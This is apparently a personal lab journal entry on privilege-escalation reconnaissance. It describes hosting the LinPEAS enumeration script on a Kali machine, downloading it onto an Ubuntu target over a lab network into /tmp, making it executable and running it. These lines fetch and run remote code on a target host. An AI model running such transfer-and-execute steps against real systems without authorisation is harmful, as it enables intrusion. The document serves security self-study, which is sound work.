üß≠ Day 7: Privilege Escalation Recon (LinPEAS Introduction)
üìù Executive Summary

Today I began the privilege escalation phase.
Rather than immediately exploiting the system, the goal was to identify potential weaknesses and misconfigurations using a standard escalation reconnaissance tool, LinPEAS.

The focus was not exploitation itself, but understanding the system‚Äôs privilege surface, service permissions, SUID binaries, and escalation vectors.

üíª Lab Scenario
1. The Setup (Kali Linux)

I downloaded the latest LinPEAS binary and prepared it for transfer.

wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
sudo python3 -m http.server 80


This provided a lightweight and controlled hosting method for the target to download the script.

2. The Import (Ubuntu Target)

Once connected via SSH, I used the same ingress method practiced on Day 6.

cd /tmp
wget http://192.168.160.130/linpeas.sh
chmod +x linpeas.sh


This confirmed repeatable tool transfer capability, now used for a real enumeration script rather than a dummy file.

3. Running LinPEAS (Initial Scan)
./linpeas.sh


Only a subset of the output was reviewed today. Full escalation analysis will continue on Day 8.

üì∏ Verification

Screenshots stored in Day07/screenshots/:

